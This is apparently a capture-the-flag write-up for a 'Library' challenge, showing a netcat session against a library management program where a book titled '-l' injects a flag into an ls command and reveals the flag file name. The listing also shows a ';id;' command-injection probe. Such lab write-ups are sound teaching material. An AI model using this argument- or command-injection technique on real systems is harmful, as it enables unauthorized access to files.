# Library - MISC

## Description

Built a book library, however my friend says that i made a nasty mistake!

Author: zAbuQasem

nc 172.190.120.133 50003

## Solution

This was a fun challenge that gave us a prompt in a custom library management software. Two interesting options are `7.Save Book` and `8.Check File Presence`. After reviewing the sorce code we see that with option 8 there might be possibility for some command injection. Some testing showed that only the `ls` command could be executed so if we gave it the `-l` flag, maybe we could see something interesting in the filesystem.

```bash
┌──(kali㉿kali)-[~/Desktop/Library]
└─$ nc 172.190.120.133 50003

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 7

Book Manager:
1. Save Existing
2. Create new book
Enter your choice (1-2): 2
Enter book title: -l
Enter book author: a
Enter book ISBN: a
Enter number of copies: 1
Book saved successfully

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 8
Enter the name of the book (file) to check: -l
total 44
-rw-r--r--    1 challeng challeng         9 Feb  9 22:33 -l
-rw-r--r--    1 challeng challeng         9 Feb  9 19:37 0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}
-rw-r--r--    1 challeng challeng         9 Feb  9 17:18 ;id;
-rw-r--r--    1 challeng challeng         9 Feb  9 17:27 a
-rw-r--r--    1 challeng challeng         9 Feb  9 19:11 alo
-rw-rw-r--    1 root     root          8975 Jan 31 22:43 challenge.py
-rw-rw-r--    1 root     root           103 Jan 31 22:19 exec.sh
-rw-r--r--    1 challeng challeng         9 Feb  9 18:07 thetales of test
-rw-r--r--    1 challeng challeng        11 Feb  9 20:53 {library}
The book is not found in the current directory.
```

Looks like there was a file named with the flag format and if we try it that seems to work. My guess is that the file needed to be creaeted with the {FLAG} variable as the name and then we could read the file system to get the flag. Cheers to who ever figured it out and got the file created with the flag name!

Flag: `0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}`
